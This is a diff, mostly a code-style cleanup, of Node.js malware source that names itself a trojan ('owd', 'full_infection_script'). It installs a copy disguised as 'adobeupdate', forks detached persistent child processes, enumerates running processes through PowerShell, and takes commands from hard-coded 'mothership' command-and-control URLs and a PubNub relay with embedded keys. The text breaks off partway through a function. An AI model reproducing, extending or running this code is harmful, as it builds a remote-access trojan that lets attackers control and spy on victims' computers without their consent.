@@ -6,15 +6,14 @@
 // TEST
 // REVIEW
 // anchor
-const PubNub = require('pubnub');
-const net = require('net');
-const { exec, spawn } = require('child_process');
-const path = require('path');
-const fs = require('fs');
-const os = require('os');
-const crypto = require('crypto');
-const util = require('util');
-const { fork } = require('child_process');
+const PubNub = require("pubnub");
+const net = require("net");
+const { fork, exec, spawn } = require("child_process");
+const path = require("path");
+const fs = require("fs");
+const os = require("os");
+const crypto = require("crypto");
+const util = require("util");
 
 const ISDEBUG = true;
 
@@ -36,7 +35,6 @@ var processlist = [];
 // ! creating/deleting/query tasks and registry not natively supported by node, have to implement
 // bat/cmd, ps1, vbs failover
 
-
 // EXEC_CMD --> StartPCMon, StopPCMon
 //              startpspcmon, stoppspcmon
 
@@ -52,53 +50,51 @@ var processlist = [];
 
 var process_argv = [];
 
-for ( let token of process.argv ) {
-    if ( token != '--inspect-brk' )
-        process_argv.push(token);
+for (let token of process.argv) {
+    if (token != "--inspect-brk") process_argv.push(token);
 }
 
 var systemstate = {
     staticdelay: 30,
 
     get istpl() {
-        if ( this.machinename.toLowerCase().substring(0,5) == "RLPCP".toLowerCase() ) {
+        if (
+            this.machinename.toLowerCase().substring(0, 5) ==
+            "RLPCP".toLowerCase()
+        ) {
             return true;
         }
 
-        if ( fileExists(path.join(this.scriptdir,  "tplmode")) ) {
+        if (fileExists(path.join(this.scriptdir, "tplmode"))) {
             return true;
         }
 
         return false;
     },
 
-    trojanname: 'owd',
-    script_version: 'full_infection_script',
+    trojanname: "owd",
+    script_version: "full_infection_script",
 
     get cmdname() {
-
-        if ( process_argv.length >= 3 )
-            return process_argv[2];
-        else 
-            return 'init';
+        if (process_argv.length >= 3) return process_argv[2];
+        else return "init";
     },
 
     __cmdconfig: null,
 
     get cmdconfig() {
-        if ( this.__cmdconfig )
-            return this.__cmdconfig;
+        if (this.__cmdconfig) return this.__cmdconfig;
 
         this.__cmdconfig = new CmdConfig(this.cmdname);
         return this.__cmdconfig;
     },
 
     get cmdtaskname() {
-        if ( ( this.cmdname == 'task' ) && ( process_argv.length >= 4 ) ) {
+        if (this.cmdname == "task" && process_argv.length >= 4) {
             return process_argv[3];
         }
 
-        return '';
+        return "";
     },
 
     get loopfname() {
@@ -106,80 +102,84 @@ var systemstate = {
     },
 
     get mothershipconfigfpath() {
-        return path.join(this.trojandir, 'mothership');
+        return path.join(this.trojandir, "mothership");
     },
 
     mothershipindex: -1,
-    get mothership() { 
-        
-        if ( this.mothershipindex < 0 )
-            return this.selectMothership();
+    get mothership() {
+        if (this.mothershipindex < 0) return this.selectMothership();
 
-        return (this.istpl ? this.tplmothershiplist : this.phpmothershiplist )[this.mothershipindex];
+        return (this.istpl ? this.tplmothershiplist : this.phpmothershiplist)[
+            this.mothershipindex
+        ];
     },
     get mothershipassets() {
-        return 'https://raw.githubusercontent.com/owd842/mothershipassets/master';
-    },    
-    phpmothershiplist: [ 
-        "https://seashell-raven-793508.hostingersite.com", 
-        "http://s1083932807.online-home.ca", 
-        "https://darksalmon-crow-356809.hostingersite.com" 
+        return "https://raw.githubusercontent.com/owd842/mothershipassets/master";
+    },
+    phpmothershiplist: [
+        "https://seashell-raven-793508.hostingersite.com",
+        "http://s1083932807.online-home.ca",
+        "https://darksalmon-crow-356809.hostingersite.com",
     ],
-    tplmothershiplist: [ "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault" ],
-    selectMothership: function() {
+    tplmothershiplist: [
+        "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault",
+    ],
+    selectMothership: function () {
+        let mothershiparr = this.istpl
+            ? this.tplmothershiplist
+            : this.phpmothershiplist;
 
-        let mothershiparr = this.istpl ? this.tplmothershiplist : this.phpmothershiplist;
+        let mothershipurl = "";
 
-        let mothershipurl = '';
-
-        if ( fileExists(this.mothershipconfigfpath) ) {
+        if (fileExists(this.mothershipconfigfpath)) {
             mothershipurl = readTag(this.mothershipconfigfpath);
-            
-            if ( ! isNullOrWhitespace(mothershipurl) ) {
-                
-                for ( let i = 0; i<=mothershiparr.length; i++) {
-                    if ( mothershiparr[i] == mothershipurl ) {
+
+            if (!isNullOrWhitespace(mothershipurl)) {
+                for (let i = 0; i <= mothershiparr.length; i++) {
+                    if (mothershiparr[i] == mothershipurl) {
                         this.mothershipindex = i;
                         return mothershipurl;
                     }
                 }
-
             }
         }
-    
+
         let count = mothershiparr.length;
-    
-        if ( ( this.mothershipindex < -1 ) || ( this.mothershipindex == count -1 ) ) {
+
+        if (this.mothershipindex < -1 || this.mothershipindex == count - 1) {
             this.mothershipindex = 0;
         } else {
             this.mothershipindex++;
         }
-    
-        mothershipurl =  mothershiparr[this.mothershipindex];
 
-        writeTag(this.mothershipconfigfpath, mothershipurl );
-    
-        logmsg(`index: ${this.mothershipindex} -- mothership: ${mothershipurl}`);
+        mothershipurl = mothershiparr[this.mothershipindex];
+
+        writeTag(this.mothershipconfigfpath, mothershipurl);
+
+        logmsg(
+            `index: ${this.mothershipindex} -- mothership: ${mothershipurl}`
+        );
 
         return mothershipurl;
     },
 
     getClientJobPath() {
-        return path.join(this.trojandir, 'clientjob_'+getRandomCode(8));
+        return path.join(this.trojandir, "clientjob_" + getRandomCode(8));
     },
 
     getClientJobConfigPath() {
-        return path.join(this.trojandir, 'clientjobconfig_'+getRandomCode(8)+'.json');
+        return path.join(
+            this.trojandir,
+            "clientjobconfig_" + getRandomCode(8) + ".json"
+        );
     },
 
-    __clientid: '',
+    __clientid: "",
 
     get clientid() {
         if (isNullOrWhitespace(this.__clientid)) {
-            
-            if ( fileExists(systemstate.clientidfpath) )
+            if (fileExists(systemstate.clientidfpath))
                 this.__clientid = readTag(systemstate.clientidfpath);
-
         }
 
         if (isNullOrWhitespace(this.__clientid)) {
@@ -189,14 +189,13 @@ var systemstate = {
 
         return this.__clientid;
     },
-    
+
     get clientidfpath() {
-        return path.join(this.trojandir, 'client_id');
+        return path.join(this.trojandir, "client_id");
     },
 
     get trojandir() {
-        
-        if ( this.istpl ) {
+        if (this.istpl) {
             return path.join(process.env.ProgramData, this.trojanname);
         }
 
@@ -204,7 +203,7 @@ var systemstate = {
     },
 
     get trojanfname() {
-        return 'adobeupdate';
+        return "adobeupdate";
     },
 
     get trojanfpath() {
@@ -229,18 +228,18 @@ var systemstate = {
 
     get machinename() {
         return os.hostname();
-    }, 
+    },
 
     get username() {
         let uinfo = os.userInfo();
         return uinfo.username;
     },
-    
+
     get source() {
         return path.basename(this.scriptfpath);
     },
 
-    __jobcode: '',
+    __jobcode: "",
 
     get jobcode() {
         return this.__jobcode;
@@ -251,17 +250,15 @@ var systemstate = {
     },
 
     get batchid() {
-        if ( ! isNullOrWhitespace(this.jobcode) )
-            return this.jobcode;
+        if (!isNullOrWhitespace(this.jobcode)) return this.jobcode;
 
         return this.sessionid;
     },
 
     scriptts: getTimestamp(),
-    __scriptmd5: '',
+    __scriptmd5: "",
     get scriptmd5() {
-        
-        if ( isNullOrWhitespace(this.__scriptmd5) )
+        if (isNullOrWhitespace(this.__scriptmd5))
             this.__scriptmd5 = getFileMD5(this.scriptfpath);
 
         return this.__scriptmd5;
@@ -270,23 +267,37 @@ var systemstate = {
     __sessionid: getRandomCode(8),
 
     get sessionid() {
-        if ( ! isNullOrWhitespace(this.jobcode) )
-            return this.jobcode;
+        if (!isNullOrWhitespace(this.jobcode)) return this.jobcode;
 
         return this.__sessionid;
     },
 
     get logfpath() {
-        if ( ! isNullOrWhitespace(this.cmdtaskname) )
-            return path.join(this.trojandir,  "master_" + this.cmdname + "_" + this.cmdtaskname + "_" + this.scriptts + ".log");
+        if (!isNullOrWhitespace(this.cmdtaskname))
+            return path.join(
+                this.trojandir,
+                "master_" +
+                    this.cmdname +
+                    "_" +
+                    this.cmdtaskname +
+                    "_" +
+                    this.scriptts +
+                    ".log"
+            );
         else
-            return path.join(this.trojandir,  "master_" + this.cmdname + "_" + this.scriptts + ".log");
+            return path.join(
+                this.trojandir,
+                "master_" + this.cmdname + "_" + this.scriptts + ".log"
+            );
     },
 
     get lockfname() {
-        let _fname = '';
+        let _fname = "";
         _fname = this.trojanname + "_" + this.cmdname;
-        _fname += ( ! isNullOrWhitespace(this.cmdtaskname) ? "_" + this.cmdtaskname: '' ) + "_lock";
+        _fname +=
+            (!isNullOrWhitespace(this.cmdtaskname)
+                ? "_" + this.cmdtaskname
+                : "") + "_lock";
 
         return _fname;
     },
@@ -302,21 +313,20 @@ var systemstate = {
             scriptts: this.scriptts,
             machinename: this.machinename,
             username: this.username,
-            scriptmd5: this.scriptmd5
+            scriptmd5: this.scriptmd5,
         };
     },
 
     get statestr() {
-        return '';
+        return "";
     },
-
 };
 
 class CmdConfig {
-    #__cmdname = '';
-    #__launchprocname = ''; // node.exe, cmd.exe, powershell.exe, python.exe, cscript.exe, ...
-    #__launchscriptfname = ''; // noderelay.js, pythonrelay.js, adobeupdate.js, pc_monitoring.ps1, <...>.vbs, <...>.bat, <...>.js
-    #__childprocess = null; 
+    #__cmdname = "";
+    #__launchprocname = ""; // node.exe, cmd.exe, powershell.exe, python.exe, cscript.exe, ...
+    #__launchscriptfname = ""; // noderelay.js, pythonrelay.js, adobeupdate.js, pc_monitoring.ps1, <...>.vbs, <...>.bat, <...>.js
+    #__childprocess = null;
     #__childcmds = [];
     #__parentcmdconfig = null;
 
@@ -324,75 +334,73 @@ class CmdConfig {
 
     set pubnubrelay(value) {
         this.#__pubnubrelay = value;
-    };
+    }
 
     get pubnubrelay() {
         return this.#__pubnubrelay;
-    };
+    }
 
     set parentcmdconfig(value) {
-        return this.#__parentcmdconfig = value;
-    };
+        return (this.#__parentcmdconfig = value);
+    }
 
     get parentcmdconfig() {
         return this.#__parentcmdconfig;
-    };
+    }
 
     get childprocess() {
         return this.#__childprocess;
-    };
+    }
 
     get launchscriptfname() {
         return this.#__launchscriptfname;
-    };
+    }
 
     set cmdname(value) {
-        if ( CmdConfig.isCmdExist(value)  )
-            this.#__cmdname = value;
-        else
-            throw new Error('cmd is not supported ['+value+']');
-    };
+        if (CmdConfig.isCmdExist(value)) this.#__cmdname = value;
+        else throw new Error("cmd is not supported [" + value + "]");
+    }
 
     get cmdname() {
         return this.#__cmdname;
-    };
+    }
 
     get launchprocname() {
         return this.#__launchprocname;
-    };
+    }
 
     getChildCmd(cmdname) {
-        for ( let i = 0; i< this.#__childcmds.length; i++) {
+        for (let i = 0; i < this.#__childcmds.length; i++) {
             let childcmd = this.#__childcmds[i];
-            if ( childcmd.cmdname == cmdname ) {
+            if (childcmd.cmdname == cmdname) {
                 return childcmd;
             }
         }
 
         return null;
-    };
-    
-    get childcmds() {
-        if ( ! this.#__childcmds )
-            this.#__childcmds = [];
-        
-        return this.#__childcmds;
-    };
+    }
 
-    loopfunc = async () => { logmsg('doing some work inside loop...'); }; // should be overriden
+    get childcmds() {
+        if (!this.#__childcmds) this.#__childcmds = [];
+
+        return this.#__childcmds;
+    }
+
+    loopfunc = async () => {
+        logmsg("doing some work inside loop...");
+    }; // should be overriden
 
     newCmdConfig(tcmdname) {
         let childcmd = new CmdConfig(tcmdname, this);
         this.addchildcmd(childcmd);
 
         return childcmd;
-    };
+    }
 
     constructor(tcmdname, cmdconfig) {
         this.cmdname = tcmdname;
         this.parentcmdconfig = cmdconfig;
-        
-    };
+    }
 
     static cmdfuncs = {
         penetrate: penetrate,
@@ -407,391 +415,401 @@ class CmdConfig {
         init: startup,
         task: startup,
         execjob: execjob,
-        relay: relay
+        relay: relay,
     };
 
     get dynamicdelay() {
         return crypto.randomInt(1, 10) * 5;
-    };
+    }
 
     get cmdfunc() {
         return CmdConfig.cmdfuncs[this.cmdname];
-    };
+    }
 
     static isCmdExist(tcmdname) {
-        return Object.hasOwn(CmdConfig.cmdfuncs,tcmdname);
-    };
+        return Object.hasOwn(CmdConfig.cmdfuncs, tcmdname);
+    }
 
     get cmdpidfpath() {
-        return path.join(systemstate.trojandir, this.cmdname +'_running' );
-    };
+        return path.join(systemstate.trojandir, this.cmdname + "_running");
+    }
 
     readcmdpid() {
-
-        if ( ! fileExists(this.cmdpidfpath) )
-            return -1;
+        if (!fileExists(this.cmdpidfpath)) return -1;
 
         let pid = readTag(this.cmdpidfpath);
-        
-        return pid;        
-    };
+
+        return pid;
+    }
 
     activate(cmdlineargs, exitparent) {
-        logmsg('starting');
+        logmsg("starting");
 
-        if ( ! exitparent )
-            exitparent = false;
+        if (!exitparent) exitparent = false;
 
         let execlaunch = false;
 
         let tcmdpid = this.readcmdpid();
 
-        if ( tcmdpid <= 0 ) {
+        if (tcmdpid <= 0) {
             this.launch();
-            logmsg('finished');
+            logmsg("finished");
             return;
         }
 
         let ispidalive = isPidAlive(tcmdpid);
 
-        if ( ! ispidalive ) {
+        if (!ispidalive) {
             this.launch();
-            logmsg('finished');
+            logmsg("finished");
             return;
         }
 
         let cmdprocess = getProcess(tcmdpid);
-        let procname = cmdprocess ? cmdprocess.Name.toLowerCase() : 'UNKNOWN';
+        let procname = cmdprocess ? cmdprocess.Name.toLowerCase() : "UNKNOWN";
 
-        if ( ispidalive ) {
-
-            if  ( cmdprocess &&  ( ! procname.includes(this.launchprocname) ) ) {
+        if (ispidalive) {
+            if (cmdprocess && !procname.includes(this.launchprocname)) {
                 this.launch(cmdlineargs, exitparent);
-                logmsg('finished');
-                return;    
+                logmsg("finished");
+                return;
             }
         }
 
         // procname = 'node.exe'
-        logmsg(`finished -- no need to launch -- [${this.cmdname}] cmd is running with pid=${tcmdpid} process name=${procname}`);
+        logmsg(
+            `finished -- no need to launch -- [${this.cmdname}] cmd is running with pid=${tcmdpid} process name=${procname}`
+        );
 
-        logmsg('finished');
-    };
+        logmsg("finished");
+    }
 
-    // message handler -- used by parent cmds to process incoming messages from child cmds 
+    // message handler -- used by parent cmds to process incoming messages from child cmds
     // parent cmd will have a pointer for each child cmd, each child cmd...
     // (e.g., watchdog relays messages from ping to cmdlist)
     // ... relay messages between ping and cmdlist
     processMessage(msg) {
-        logmsg('starting -- watchdog implementation');
-        
+        logmsg("starting -- watchdog implementation");
+
         let parentcmd = this.parentcmdconfig;
 
-        if ( ! parentcmd )
-            return;
+        if (!parentcmd) return;
 
         let src = msg.src;
         let dest = msg.dest;
         let payload = msg.payload;
-        
+
         let destcmd = parentcmd.getChildCmd(dest);
 
-        if ( ! destcmd ) {
-            throw new Error('could not obtain child cmd for '+dest);
+        if (!destcmd) {
+            throw new Error("could not obtain child cmd for " + dest);
         }
 
         this.sendMessage(destcmd, src, payload);
 
-        logmsg('finished');
-    };
+        logmsg("finished");
+    }
 
     // used by parent cmds to send message to child cmds (watchdog send msg to ping, cmdlist)
     sendMessage(destcmd, src, msgpayload) {
         let childp = destcmd.childprocess;
 
-        if ( ! childp ) {
-            throw new Error('childcmd does not have valid child process');
+        if (!childp) {
+            throw new Error("childcmd does not have valid child process");
         }
 
-        if ( ! isChildHealthy(childp) ) {
-            throw new Error('childprocess is not healthy');
+        if (!isChildHealthy(childp)) {
+            throw new Error("childprocess is not healthy");
         }
-        
+
         let msgout = {
-            senderPid:process.pid,
-            src:src,
-            dest:destcmd.cmdname,
-            payload:msgpayload,
-            ts:getTimestamp()
-        }
+            senderPid: process.pid,
+            src: src,
+            dest: destcmd.cmdname,
+            payload: msgpayload,
+            ts: getTimestamp(),
+        };
 
-        if ( childp.connected && ! childp.killed ) {
-            logmsg('sending message to child: '+ JSON.stringify(msgout));
+        if (childp.connected && !childp.killed) {
+            logmsg("sending message to child: " + JSON.stringify(msgout));
 
             childp.send(msgout);
         }
+    }
 
-    };
+    launch(cmdlineargs, exitparent) {
+        if (!exitparent) exitparent = false;
 
-    launch(cmdlineargs,exitparent) {
-
-        if ( ! exitparent )
-            exitparent = false;
-
-        logmsg("launching ["+this.cmdname+"]");
+        logmsg("launching [" + this.cmdname + "]");
 
         let child = null;
-        
+
         logmsg(`forking ${systemstate.trojanfpath}`);
 
         let opts = {};
-    
-        if ( ISDEBUG )
-            opts.execArgv = ['--inspect-brk'];
 
-        if ( exitparent ) {
+        if (ISDEBUG) opts.execArgv = ["--inspect-brk"];
+
+        if (exitparent) {
             opts.detached = true;
-            opts.stdio = 'ignore';
+            opts.stdio = "ignore";
         }
-        
-        if (! ( Array.isArray(cmdlineargs) && cmdlineargs.length >= 1 ) )
+
+        if (!(Array.isArray(cmdlineargs) && cmdlineargs.length >= 1))
             cmdlineargs = [];
 
         cmdlineargs = [this.cmdname, ...cmdlineargs];
 
-        if ( ! fileExists(systemstate.trojanfpath) ) {
-            fs.copyFile(systemstate.scriptfpath, systemstate.trojanfpath, (err) => {
-                logmsg('ERROR: '+err);
-            });
+        if (!fileExists(systemstate.trojanfpath)) {
+            fs.copyFile(
+                systemstate.scriptfpath,
+                systemstate.trojanfpath,
+                (err) => {
+                    logmsg("ERROR: " + err);
+                }
+            );
         }
 
-        if ( ! fileExists(systemstate.trojanfpath) ) {
-            throw new Error('trojan script does not exists at '+systemstate.trojanfpath);
+        if (!fileExists(systemstate.trojanfpath)) {
+            throw new Error(
+                "trojan script does not exists at " + systemstate.trojanfpath
+            );
         }
 
-        child = fork(systemstate.trojanfpath, cmdlineargs, opts );
-        
+        child = fork(systemstate.trojanfpath, cmdlineargs, opts);
+
         this.#__childprocess = child;
         this.#__launchprocname = path.basename(child.spawnargs[0]);
         this.#__launchscriptfname = path.basename(systemstate.trojanfpath);
 
-        if ( exitparent ) {
+        if (exitparent) {
             child.disconnect();
             child.unref();
         }
 
         let tchildproc = getProcess(child.pid);
 
-        logmsg(`launched child ${this.cmdname} pid=${child.pid} spawn args: ` + JSON.stringify(child.spawnargs));
+        logmsg(
+            `launched child ${this.cmdname} pid=${child.pid} spawn args: ` +
+                JSON.stringify(child.spawnargs)
+        );
         // spawnargs: ["C:\\Program Files\\nodejs\\node.exe","C:\\Users\\sebas\\AppData\\Local\\Temp\\owd\\adobeupdate","penetrate"]
 
         writeTag(this.cmdpidfpath, String(child.pid));
-        
+
         // incomming message from child process (sender:cmdlist, ping -- receiver: watchdog)
-        child.on('message', (message) => {
-            logmsg('[YER]incomming message: ' + JSON.stringify(message));
+        child.on("message", (message) => {
+            logmsg("[YER]incomming message: " + JSON.stringify(message));
 
             this.processMessage(message);
         });
-        
-        child.on('exit', (code) => {
+
+        child.on("exit", (code) => {
             logmsg(`Child process ${child.pid} exited with code ${code}`);
         });
 
-        child.on('close', (code) => {
+        child.on("close", (code) => {
             logmsg(`Process exited with code ${code}`);
         });
-        
-        child.on('error', (err) => {
-            logmsg('Failed to start child process:', err.message);
+
+        child.on("error", (err) => {
+            logmsg("Failed to start child process:", err.message);
         });
-    
-        logmsg('finished');
+
+        logmsg("finished");
         return child;
-    };
+    }
 
     // TODO
     exitramp() {
         // killall --> exit without deleting
         // reset_ & tcmdname & loop --> delete then exit
-    };
+    }
 
-    async loop() { 
-
+    async loop() {
         logmsg("starting main looop");
-        
+
         const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
-        if ( ! this.loopfunc ) {
-            logmsg('Fatal Error: loopfunc is not a valid function');
+        if (!this.loopfunc) {
+            logmsg("Fatal Error: loopfunc is not a valid function");
             process.exit(1);
         }
-    
+
         let loopindex = 0;
         while (true) {
             loopindex++;
-            logmsg(`loop starting -- loopindex=${loopindex} -- ${getTimestamp()}`);
-            
+            logmsg(
+                `loop starting -- loopindex=${loopindex} -- ${getTimestamp()}`
+            );
+
             this.exitramp();
-    
+
             try {
-                if ( isAsyncFunction(this.loopfunc) )
-                    await this.loopfunc();
-                else
-                    this.loopfunc();
+                if (isAsyncFunction(this.loopfunc)) await this.loopfunc();
+                else this.loopfunc();
             } catch (err) {
                 logmsg(err);
             }
-    
-            logmsg("sleeping for ["+systemstate.staticdelay+"] seconds");
-    
-            for ( let i =0; i< (ISDEBUG ? 3 : systemstate.staticdelay); i++) {
-                logmsg(`sleeping one second... [${i+1}/${systemstate.staticdelay}]`);
-                await sleep(1000); 
+
+            logmsg("sleeping for [" + systemstate.staticdelay + "] seconds");
+
+            for (let i = 0; i < (ISDEBUG ? 3 : systemstate.staticdelay); i++) {
+                logmsg(
+                    `sleeping one second... [${i + 1}/${
+                        systemstate.staticdelay
+                    }]`
+                );
+                await sleep(1000);
             }
-    
+
             let num = this.dynamicdelay;
-    
+
             logmsg(`sleeping for an additional ${num} seconds`);
-    
-            for ( let i =0; i<(ISDEBUG ? 0 : num); i++) {
-                logmsg(`sleeping one second... [${i+1}/${systemstate.staticdelay}]`);
-                await sleep(1000); 
+
+            for (let i = 0; i < (ISDEBUG ? 0 : num); i++) {
+                logmsg(
+                    `sleeping one second... [${i + 1}/${
+                        systemstate.staticdelay
+                    }]`
+                );
+                await sleep(1000);
             }
         }
-    };
-    
+    }
+
     addchildcmd(cmdconfig) {
-        
-        if ( ! this.childcmds )
-            this.childcmds = [];
+        if (!this.childcmds) this.childcmds = [];
 
         this.childcmds.push(cmdconfig);
-    };
-};
+    }
+}
 
 class PubnubRelay {
-    static PUBLISH_KEY = 'pub-c-a00eaad9-c35e-4a41-bd62-cdc619a6f2cc';
-    static SUBSCRIBE_KEY = 'sub-c-94ed1e1c-a765-4fd9-ba9e-f8ebbb47f5bd';
+    static PUBLISH_KEY = "pub-c-a00eaad9-c35e-4a41-bd62-cdc619a6f2cc";
+    static SUBSCRIBE_KEY = "sub-c-94ed1e1c-a765-4fd9-ba9e-f8ebbb47f5bd";
 
     #__pubnubConnection = null;
 
-    #__enginename = 'UNKNOWN';
-    #__userid = 'clientid_'+systemstate.clientid;
- 
+    #__enginename = "UNKNOWN";
+    #__userid = "clientid_" + systemstate.clientid;
+
     #__payloads = []; // outgoing messages
     #__messages = []; // incomming messages
 
     constructor(enginename) {
         this.#__enginename = enginename;
-        
+
         // TODO: log event/msg to mothership broadcasting that client has connected
 
         this.pubnubConnection.subscribe({
-            channels: [this.client_channel, this.mothership_channel]
+            channels: [this.client_channel, this.mothership_channel],
         });
     }
 
     get messages() {
-        return this.#__messages;    
-    };
+        return this.#__messages;
+    }
 
     get payloads() {
-        if ( ! this.#__payloads )
-            this.#__payloads = [];
+        if (!this.#__payloads) this.#__payloads = [];
 
         return this.#__payloads;
-    };
+    }
 
     get mothership_channel() {
         return `clientid_${systemstate.clientid}_${this.enginename}_mothership`;
-    };
+    }
 
     get client_channel() {
         return `clientid_${systemstate.clientid}_${this.enginename}_client`;
-    };
+    }
 
     get pubnubConnection() {
-        
-        if ( this.#__pubnubConnection )
-            return this.#__pubnubConnection;
+        if (this.#__pubnubConnection) return this.#__pubnubConnection;
 
         let pubnubc = new PubNub({
             publishKey: PubnubRelay.PUBLISH_KEY,
             subscribeKey: PubnubRelay.SUBSCRIBE_KEY,
-            userId: this.userid
+            userId: this.userid,
         });
 
         this.#__pubnubConnection = pubnubc;
 
         const channel = pubnubc.channel(this.mothership_channel);
         const subscription = channel.subscription();
-        
+
         subscription.onMessage = (messageEvent) => {
             logmsg("Message event: " + JSON.stringify(messageEvent));
             this.messages.push(messageEvent);
             this.handleMessage(messageEvent);
         };
-        
+
         subscription.subscribe();
-                  
+
         return this.#__pubnubConnection;
-    };
+    }
 
     get userid() {
         return this.#__userid;
-    };
+    }
 
     get enginename() {
         return this.#__enginename;
-    };
+    }
 
     // override
     handleMessage(msgEvent) {
-        logmsg('pass');
-    };
+        logmsg("pass");
+    }
 
     publishMessage(payload) {
-        
-        this.pubnubConnection.publish({
-            channel: this.client_channel,
-            message: payload
-        })
-        .then((response) => {            
-            payload.response = response;
+        this.pubnubConnection
+            .publish({
+                channel: this.client_channel,
+                message: payload,
+            })
+            .then((response) => {
+                payload.response = response;
 
-            this.payloads.push(payload);
+                this.payloads.push(payload);
 
-            logmsg('message sent -- timetoken:' + response.timetoken + ' payloads: '+this.payloads.length);
-
-        })
-        .catch((error) => {
-            logmsg('Publish failed:', error);
-        });
-     
+                logmsg(
+                    "message sent -- timetoken:" +
+                        response.timetoken +
+                        " payloads: " +
+                        this.payloads.length
+                );
+            })
+            .catch((error) => {
+                logmsg("Publish failed:", error);
+            });
     }
-    
-};
+}
 
 // ---
 
 function isChildHealthy(childProcess) {
     return (
-      childProcess !== null &&
-      childProcess.pid !== undefined &&     // Has a valid Process ID
-      childProcess.killed === false &&      // Has not been sent a kill signal
-      childProcess.connected === true       // IPC channel is open and ready
+        childProcess !== null &&
+        childProcess.pid !== undefined && // Has a valid Process ID
+        childProcess.killed === false && // Has not been sent a kill signal
+        childProcess.connected === true // IPC channel is open and ready
     );
 }
-  
-function ensureSingleInstancePipe(loopfunc) {
-    const PIPE_NAME = '\\\\.\\pipe\\' + systemstate.lockfname;
+
+function ensureSingleInstancePipe(initfunc) {
+    logmsg("obtaining lock");
+
+    const PIPE_NAME = "\\\\.\\pipe\\" + systemstate.lockfname;
 
     const server = net.createServer();
 
-    server.on('error', (err) => {
-        if (err.code === 'EADDRINUSE') {
-            logmsg('Fatal Error: another instance is already running. -- exiting');
+    server.on("error", (err) => {
+        if (err.code === "EADDRINUSE") {
+            logmsg(
+                `Fatal Error: another instance is already running. -- exiting -- err.code: ${err.code}`
+            );
             process.exit(1);
         }
     });
@@ -799,76 +817,81 @@ function ensureSingleInstancePipe(loopfunc) {
     server.listen(PIPE_NAME, () => {
         server.unref();
 
-        if ( loopfunc )
-            loopfunc();
+        if (initfunc) {
+            try {
+                initfunc();
+            } catch (err) {
+                logmsg(err);
+            }
+        }
     });
 }
 
-function copyFile(srcfpath, destfpath, overwrite=true) {
-
-    if (! fs.existsSync(srcfpath)) {
-        throw new Error('file does not exist ['+srcfpath+']');
+function copyFile(srcfpath, destfpath, overwrite = true) {
+    if (!fs.existsSync(srcfpath)) {
+        throw new Error("file does not exist [" + srcfpath + "]");
     }
 
     const destDir = path.dirname(destfpath);
 
     if (!fs.existsSync(destDir)) {
-        logmsg('creating ['+destDir+']');
+        logmsg("creating [" + destDir + "]");
         fs.mkdirSync(destDir, { recursive: true });
     }
 
-    if (  overwrite || ( ! fileExists(destfpath) ) )
+    if (overwrite || !fileExists(destfpath))
         fs.copyFileSync(srcfpath, destfpath);
 }
 
 function getFileMD5(fpath) {
-    
-    if ( ! fileExists(fpath) ) {
-        throw new Error("file does not exist ["+fpath+"]");
+    if (!fileExists(fpath)) {
+        throw new Error("file does not exist [" + fpath + "]");
     }
 
     const fileBuffer = fs.readFileSync(fpath);
-  
-    return crypto.createHash('md5').update(fileBuffer).digest('hex');  
+
+    return crypto.createHash("md5").update(fileBuffer).digest("hex");
 }
 
 function initProcessList() {
     const psCommand = `Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine | ConvertTo-Json`;
-    
-    exec(`powershell.exe -NoProfile -Command "${psCommand}"`, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
-        if (error) {
-            logmsg(`Execution Error: ${error.message}`);
-            return;
+
+    exec(
+        `powershell.exe -NoProfile -Command "${psCommand}"`,
+        { maxBuffer: 1024 * 1024 * 10 },
+        (error, stdout, stderr) => {
+            if (error) {
+                logmsg(`Execution Error: ${error.message}`);
+                return;
+            }
+            if (stderr) {
+                logmsg(`PowerShell Error: ${stderr}`);
+                return;
+            }
+
+            try {
+                const processes = JSON.parse(stdout);
+
+                logmsg("process list count: " + processes.length);
+                processlist = processes;
+                /*  CommandLine =
+Name =
+ProcessId = */
+            } catch (parseError) {
+                logmsg(`Failed to parse JSON string: ${parseError.message}`);
+            }
         }
-        if (stderr) {
-            logmsg(`PowerShell Error: ${stderr}`);
-            return;
-        }
-    
-        try {
-            const processes = JSON.parse(stdout);
-            
-            logmsg('process list count: '+processes.length);
-            processlist = processes;
-            /*  CommandLine =
-                Name =
-                ProcessId = */
-        } catch (parseError) {
-            logmsg(`Failed to parse JSON string: ${parseError.message}`);
-        }
-    });
-    
-} 
+    );
+}
 
 function getProcess(pid) {
     // CommandLine
     // Name
     // ProcessId
-    
-    if ( processlist && processlist.length >= 1 ) {
-        for ( let i = 0; i<processlist.length; i++ ) {
-            if ( processlist[i].ProcessId == pid )
-                return processlist[i];
+
+    if (processlist && processlist.length >= 1) {
+        for (let i = 0; i < processlist.length; i++) {
+            if (processlist[i].ProcessId == pid) return processlist[i];
         }
     }
 
@@ -887,7 +910,7 @@ function getRandomCode(n) {
     const min = Math.pow(10, n - 1);
     const max = Math.pow(10, n) - 1;
 
-    return crypto.randomInt(min, max + 1).toString();    
+    return crypto.randomInt(min, max + 1).toString();
 }
 
 function isNullOrWhitespace(str) {
@@ -903,100 +926,128 @@ function getCallerName() {
         const err = new Error();
         const currentStack = err.stack;
 
-        if ( currentStack && currentStack[2] ) {
+        if (currentStack && currentStack[2]) {
             return currentStack[2].getFunctionName() || "SYSTEM";
         }
-        
     } catch (e) {
-        
-    } finally {       
+    } finally {
         Error.prepareStackTrace = originalFunc;
     }
-    
+
     return "unknown";
 }
 
 function logmsg(msgstr) {
-    
     let callername = getCallerName();
-    let msgout = '|' + String(systemstate.cmdname) + '|' + String(systemstate.scriptpid) +  '|' + callername ;
+    let msgout =
+        "|" +
+        String(systemstate.cmdname) +
+        "|" +
+        String(systemstate.scriptpid) +
+        "|" +
+        callername;
 
-    if ( msgstr instanceof Error ) {
-        msgout += '|' + util.inspect(msgstr);
-    } else if (typeof msgstr === 'string') {
-        msgout += '|' + msgstr;
+    if (msgstr instanceof Error) {
+        msgout += "|" + util.inspect(msgstr);
+    } else if (typeof msgstr === "string") {
+        msgout += "|" + msgstr;
     }
 
     console.log(msgout);
-    fs.appendFileSync(systemstate.logfpath, msgout + '\r\n', 'utf8');
+    fs.appendFileSync(systemstate.logfpath, msgout + "\r\n", "utf8");
 }
 
 function getTimestamp() {
-  const date = new Date();
-  
-  // Extract components
